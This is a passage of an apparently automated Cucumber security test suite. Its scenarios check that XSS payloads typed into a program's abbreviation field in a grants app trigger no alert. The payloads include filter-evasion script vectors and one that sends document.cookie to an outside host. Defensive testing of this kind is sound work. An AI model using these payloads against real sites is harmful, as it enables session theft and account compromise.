      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                        | Field                |
      | <script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300912 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                     | Field                |
      | <script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300913 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                             | Field                |
      | <script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300914 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                    | Field                |
      | <script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300915 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                  | Field                |
      | <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300919 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300923 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                 | Field                |
      | <script>location='javascript:alert\x281\x29'</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300928 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <script>location=name</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300931 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                     | Field                |
      | <script>alert`1`</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300932 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                               | Field                |
      | <script>new Function`X${document.location.hash.substr`1`}`</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300934 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                             | Field                |
      | <script>Function`X${document.location.hash.substr`1`}```</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300938 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <video><source onerror=location=/\02.rs/+document.cookie> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300945 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                | Field                |
      | <svg onload=alert(1) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300946 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                    | Field                |
      | <svg onload=alert(1)<!-- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300947 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | <script>throw[onerror]=[alert],1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300959 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                             | Field                |
      | <script>var{a:onerror}={a:alert};throw 1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300961 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                              | Field                |
      | <script>var{haha:onerror=alert}=0;throw 1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300962 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                         | Field                |
      | <script>window.name='javascript:alert(1)';</script><svg onload=location=name> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
